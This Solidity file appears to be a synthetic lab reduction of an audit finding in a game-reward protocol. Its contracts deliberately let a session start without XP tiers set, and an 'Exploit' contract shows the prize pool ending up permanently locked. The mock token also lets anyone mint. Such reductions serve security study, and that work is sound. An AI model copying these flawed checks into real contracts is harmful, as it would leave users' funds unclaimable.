// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Majority Protocol — start without setXPTiers → zero / unclaimable rewards
    (Cyfrin / Dacian, 2026-01-27 majority-protocol-v2.0, #65378)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: DefaultSession.setXPTiers requires Created state, but
    SessionManager.startAndRevealGameQuestion does not require XP tiers.
    Without tiers, proportional XP rewards resolve to 0 (or claim reverts
    NoRewardAvailable), so the prize pool is permanently locked after
    Concluded.

    Vulnerable line: start path omits XP-tiers configured check (@> VULN).
    Provenance: Engage-Protocol/engage-protocol @ cca0cb3
    Fixed: 65727de.
//////////////////////////////////////////////////////////////////////////*/

contract MockToken {
    string public constant name = "USDC";
    string public constant symbol = "USDC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allowance");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Reduced DefaultSession — XP tiers optional at start.
contract DefaultSession {
    mapping(uint256 => uint256[]) public xpTiers;
    mapping(uint256 => mapping(address => uint256)) public userXP; // stored session XP
    mapping(uint256 => address[]) public winners;
    SessionManager public sessionManager;

    error GameNotCreated(uint256 gameId);
    error NotGameCreator(address creator, address caller);

    constructor(address _sm) {
        sessionManager = SessionManager(_sm);
    }

    function setXPTiers(uint256 gameId, uint256[] memory _xpTiers) external {
        require(
            msg.sender == sessionManager.getCreator(gameId),
            NotGameCreator(sessionManager.getCreator(gameId), msg.sender)
        );
        require(_xpTiers.length >= 2, "len");
        require(
            sessionManager.getSessionState(gameId) == SessionManager.SessionState.Created, GameNotCreated(gameId)
        );
        xpTiers[gameId] = _xpTiers;
    }

    function getXPTiers(uint256 gameId) external view returns (uint256[] memory) {
        return xpTiers[gameId];
    }

    /// @dev XP for a "correct" answer uses xpTiers[0]. Empty tiers → 0 XP (harm path).
    function computeXP(uint256 gameId, bool correct) public view returns (uint256) {
        uint256[] storage tiers = xpTiers[gameId];
        if (tiers.length < 2) {
            // Missing tiers: score path yields zero XP (cannot configure post-start).
            return 0;
        }
        return correct ? tiers[0] : tiers[1];
    }

    function recordResults(uint256 gameId, address[] calldata _winners, bool[] calldata correct) external {
        for (uint256 i = 0; i < _winners.length; i++) {
            userXP[gameId][_winners[i]] = computeXP(gameId, correct[i]);
        }
        winners[gameId] = _winners;
    }

    function getWinners(uint256 gameId) external view returns (address[] memory) {
        return winners[gameId];
    }
}

/// @dev ProportionalToXPReward — reward = userXP * prize / totalXP; zero XP → zero reward.
contract ProportionalToXPReward {
    mapping(uint256 => uint256) public numberOfWinners;
    SessionManager public sessionManager;
    DefaultSession public session;

    error NumberOfWinnersMismatch(uint256 sessionId, uint256 numberOfWinners);
    error NoRewardAvailable(uint256 gameId);

    constructor(address _sm, address _session) {
        sessionManager = SessionManager(_sm);
        session = DefaultSession(_session);
    }

    function setNumberOfWinners(uint256 sessionId, uint256 n) external {
        require(sessionManager.getSessionState(sessionId) == SessionManager.SessionState.Created, "created");
        numberOfWinners[sessionId] = n;
    }

    function getReward(uint256 sessionId, address[] calldata winners, uint256 position, uint256 prizePool)
        external
        view
        returns (uint256 reward)
    {
        require(numberOfWinners[sessionId] == winners.length, NumberOfWinnersMismatch(sessionId, winners.length));
        uint256 userXP_;
        uint256 totalXP;
        for (uint256 i = 0; i < winners.length; ++i) {
            uint256 xp = session.userXP(sessionId, winners[i]);
            if (i == position) userXP_ = xp;
            totalXP += xp;
        }
        if (totalXP == 0) {
            // All XP zero because tiers unset → cannot pay proportional rewards.
            return 0;
        }
        reward = userXP_ * prizePool / totalXP;
    }
}

contract SessionManager {
    enum SessionState {
        Created,
        Ongoing,
        Ended,
        Cancelled,
        Concluded
    }

    struct GamePool {
        uint256 ticketPrice;
        uint256 totalCollectedAmount;
        address token;
    }

    struct Game {
        SessionState state;
        address creator;
        address sessionStrategy;
        address rewardStrategy;
        uint256 numContestants;
    }

    mapping(uint256 => Game) public games;
    mapping(uint256 => GamePool) public gamePools;
    mapping(uint256 => mapping(address => bool)) public hasClaimed;
    uint256 public nextGameId = 1;

    error NoRewardAvailable(uint256 gameId);

    function createGame(uint256 ticketPrice, address token, address sessionStrategy, address rewardStrategy)
        external
        returns (uint256 gameId)
    {
        gameId = nextGameId++;
        games[gameId] = Game({
            state: SessionState.Created,
            creator: msg.sender,
            sessionStrategy: sessionStrategy,
            rewardStrategy: rewardStrategy,
            numContestants: 0
        });
        gamePools[gameId] =
            GamePool({ticketPrice: ticketPrice, totalCollectedAmount: 0, token: token});
    }

    function joinGame(uint256 _gameId) external {
        GamePool storage pool = gamePools[_gameId];
        MockToken(pool.token).transferFrom(msg.sender, address(this), pool.ticketPrice);
        pool.totalCollectedAmount += pool.ticketPrice;
        games[_gameId].numContestants++;
    }

    function startAndRevealGameQuestion(uint256 _gameId) external {
        Game storage game = games[_gameId];
        require(game.state == SessionState.Created, "created");
        // FIX: require(xpTiers configured on session strategy);
        game.state = SessionState.Ongoing; // @> VULN: starts without XP tiers set
    }

    function endGame(uint256 _gameId) external {
        games[_gameId].state = SessionState.Ended;
    }

    function concludeGame(uint256 _gameId) external {
        require(DefaultSession(games[_gameId].sessionStrategy).getWinners(_gameId).length > 0, "no winners");
        games[_gameId].state = SessionState.Concluded;
    }

    function claimRewards(uint256 _gameId, uint256 position) external {
        require(games[_gameId].state == SessionState.Concluded, "concluded");
        address[] memory w = DefaultSession(games[_gameId].sessionStrategy).getWinners(_gameId);
        require(w[position] == msg.sender, "not winner");
        uint256 prizePool = gamePools[_gameId].totalCollectedAmount;
        uint256 reward =
            ProportionalToXPReward(games[_gameId].rewardStrategy).getReward(_gameId, w, position, prizePool);
        // Real DepositManager rejects zero rewards — funds stay locked.
        require(reward != 0, NoRewardAvailable(_gameId));
        require(!hasClaimed[_gameId][msg.sender], "claimed");
        hasClaimed[_gameId][msg.sender] = true;
        MockToken(gamePools[_gameId].token).transfer(msg.sender, reward);
        gamePools[_gameId].totalCollectedAmount -= reward;
    }

    function getSessionState(uint256 gameId) external view returns (SessionState) {
        return games[gameId].state;
    }

    function getCreator(uint256 gameId) external view returns (address) {
        return games[gameId].creator;
    }
}

contract Player {
    MockToken public tok;
    SessionManager public sm;

    constructor(MockToken _tok, SessionManager _sm) {
        tok = _tok;
        sm = _sm;
    }

    function fundAndJoin(uint256 gameId, uint256 fee) external {
        tok.approve(address(sm), fee);
        sm.joinGame(gameId);
    }

    function tryClaim(uint256 gameId, uint256 pos) external returns (bool) {
        try sm.claimRewards(gameId, pos) {
            return true;
        } catch {
            return false;
        }
    }
}

contract Exploit {
    MockToken public tok; // CREATE 1
    SessionManager public sm; // CREATE 2
    DefaultSession public session; // CREATE 3
    ProportionalToXPReward public rewards; // CREATE 4
    Player public player; // CREATE 5

    uint256 public constant FEE = 10 ether;
    uint256 public constant GAME_ID = 1;

    constructor() {
        tok = new MockToken();
        sm = new SessionManager();
        session = new DefaultSession(address(sm));
        rewards = new ProportionalToXPReward(address(sm), address(session));
        player = new Player(tok, sm);
    }

    function run() external {
        // Create with ProportionalToXP — set numberOfWinners, but NOT xpTiers.
        sm.createGame(FEE, address(tok), address(session), address(rewards));
        rewards.setNumberOfWinners(GAME_ID, 1);
        // deliberately skip session.setXPTiers

        tok.mint(address(player), FEE);
        player.fundAndJoin(GAME_ID, FEE);

        // Start without XP tiers (VULN).
        sm.startAndRevealGameQuestion(GAME_ID);

        // Cannot set tiers after start.
        uint256[] memory tiers = new uint256[](2);
        tiers[0] = 100;
        tiers[1] = 1;
        try session.setXPTiers(GAME_ID, tiers) {
            revert("setXPTiers should fail after start");
        } catch {
            // expected GameNotCreated / not Created
        }

        // Progress: record results with "correct" answer — XP stays 0 (no tiers).
        sm.endGame(GAME_ID);
        address[] memory w = new address[](1);
        w[0] = address(player);
        bool[] memory correct = new bool[](1);
        correct[0] = true;
        session.recordResults(GAME_ID, w, correct);
        require(session.userXP(GAME_ID, address(player)) == 0, "xp must be zero without tiers");
        sm.concludeGame(GAME_ID);

        // Claim reverts NoRewardAvailable — prize pool permanently locked.
        bool claimed = player.tryClaim(GAME_ID, 0);
        require(!claimed, "claim should fail");
        require(tok.balanceOf(address(sm)) == FEE, "locked prize pool");
        require(tok.balanceOf(address(player)) == 0, "player got nothing");
    }
}
